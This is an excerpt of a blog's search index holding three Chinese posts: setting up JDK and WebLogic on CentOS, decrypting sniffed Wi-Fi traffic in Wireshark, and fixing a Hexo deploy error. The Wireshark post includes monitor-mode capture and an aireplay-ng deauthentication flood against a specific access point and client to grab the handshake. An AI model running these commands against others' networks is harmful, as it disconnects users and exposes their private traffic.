    <content type="text"><![CDATA[Centos搭建Weblogic容器 安装JDK安装前需要先卸载Centos自带的OpenJDK，然后安装新的JDK。 下载地址1http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html 卸载OpenJDK1234rpm -qa | grep java然后把带有OpenJDK的删除，如yum -y remove java-1.7.0-openjdk ... 安装下载的JDK1rpm -ivh /tmp/jdk-8u45-linux-x64.rpm JDK安装路径为/usr/java 设置环境变量123456vim /etc/profile加入：JAVA_HOME=/usr/java/jdk1.8.0_45JRE_HOME=/usr/java/jdk1.8.0_45/jrePATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/binexport JAVA_HOME JRE_HOME PATH CLASSPATH 使设置生效1source /etc/profile 参考 http://www.live-in.org/archives/2486.htmlhttp://blog.csdn.net/duguduchong/article/details/8816371 安装Weblogic容器下载地址1http://www.oracle.com/technetwork/cn/middleware/ias/downloads/wls-main-091116-zhs.html 具体的安装过程，也是网上有的，亲测可用。 参考 http://www.live-in.org/archives/2491.html 具体的命令行安装还可以参考 http://linux.it.net.cn/CentOS/course/2017/0827/27158.html]]></content>
      <categories>
        <category>系统环境</category>
      </categories>
      <tags>
        <tag>Centos</tag>
        <tag>Weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用Wireshark解密无线网络数据包]]></title>
    <url>%2F%2Fblog%2F%E7%94%A8Wireshark%E8%A7%A3%E5%AF%86%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%8C%85.html</url>
    <content type="text"><![CDATA[当知道WIFI密码时，不需要直接连接WIFI，就可以抓取数据包 抓取数据包开启网卡的监听模式1airmon-ng start wlan0 抓取指定AP的网络数据包1airodump-ng -c 11 -w xyw --bssid 36:DE:1A:98:F6:2A wlan0mon --output-format pcap 这里--output-format是输出文件的文件格式 需要注意是，在抓的包中必须要有握手包，可以慢慢等，也可以进行洪水攻击 使用洪水攻击使其掉线，然后抓握手包1aireplay-ng -0 10 -a 36:DE:1A:98:F6:2A -c 14:F6:5A:A1:37:97 wlan0mon 再等上一段时间，就停止抓包。 解密数据包刚抓到的数据包用Wireshark打开的话，是看不到具体的东西的需要解密。 打开Wireshark后，先在Edit-&gt;preference-&gt;protocols-&gt;IEEE 802.11中启动Enable decryption 然后点上view-&gt;Wireless Toolbar，就会在后面出现Decryptions Keys 点击这个Decryptions Keys，输入密码和SSID，然后点击apply,ok 最后view-&gt;reload,就可以看到里面具体的数据了 命令行可以使用命令行直接解包1wireshark -r xyw-02.cap -o wlan.enable_decryption:TRUE -o wlan.wep_key1:wpa-pwd:12345678:xyw -r 后面接要打开的数据包 -o参数是要改变preference里面的设置 不过这是早期版本的Wireshark可以用 ，较新的版本里都不能使用 新版本可以试下1wireshark -r xyw-02.cap -o wlan.enable_decryption:TRUE -o &quot;uat:80211_keys:\&quot;wpa-pwd\&quot;,\&quot; 12345678:xyw\&quot;&quot; 自己测试是成功的 参考 http://www.lovemytool.com/blog/2010/05/wireshark-and-tshark-decrypt-sample-capture-file-by-joke-snelders.html https://wiki.wireshark.org/HowToDecrypt802.11 https://ask.wireshark.org/questions/24249/decrypt-wpa-with-tshark]]></content>
      <categories>
        <category>无线</category>
      </categories>
      <tags>
        <tag>Wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ERROR Deployer not found: git hexo d 报错]]></title>
    <url>%2F%2Fblog%2F1505536580617.html</url>
    <content type="text"><![CDATA[刚搭建hexo的时候执行hexo d，总是会报错：1ERROR Deployer not found: git 网上查了之后，大多都说是12npm install hexo-deployer-git --save 重新 deploy 即可 最后也是照做了，但是还是报同样的错误，最后想是把这些文件都给删了，重新来一次123hexo init yourfoldercd yourfoldernpm install 当然好了之后，就要修改自己的_config.yml文件，然后123hexo cleanhexo ghexo d 居然莫名其妙的成功了，看来网上说的npm install hexo-deployer-git --save 也是正确方法，只不过，文件被我各种尝试给搞乱了，重新来一次就可以了。]]></content>
      <categories>
        <category>解决报错</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
</search>
